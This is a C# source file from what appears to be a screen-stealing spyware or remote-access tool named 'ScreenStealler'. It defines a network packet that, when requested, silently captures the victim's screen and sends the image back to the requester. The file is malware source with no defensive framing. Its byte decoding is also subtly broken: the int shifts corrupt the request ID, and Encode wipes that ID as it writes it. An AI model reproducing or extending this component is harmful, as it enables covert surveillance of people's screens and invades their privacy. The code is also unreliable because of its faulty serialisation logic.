using ScreenStealler_Client.Packet;
using ScreenStealler_Network.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ScreenStealler_Client.Packets
{
    internal class Packet_Get_Screen : Packet_Base<Packet_Types>
    {
        byte[] screen_data = new byte[0];
        private long Request_ID;
        public override void Decode(byte[] raw_data)
        {
            Request_ID = 0;
            for (int i = 0; i < 8; i++)
                Request_ID |= raw_data[i] << (i << 3);
        }

        public override byte[] Encode()
        {
            byte[] result = new byte[8 + screen_data.Length];
            int i = 0;
            for (i = 0; i < 8; i++)
            {
                result[i] = (byte)(Request_ID & 0xff);
                Request_ID >>= 8;
            }
            for (; i < result.Length; i++) result[i] = screen_data[i - 8];
            return result;
        }

        public override void Execute(Client<Packet_Types> client)
        {
            screen_data = Screen_Helper.Get_Screen();
            client.Send_Message(this);
        }

        public override Packet_Types Get_Type() => Packet_Types.Get_Screen;
    }
}
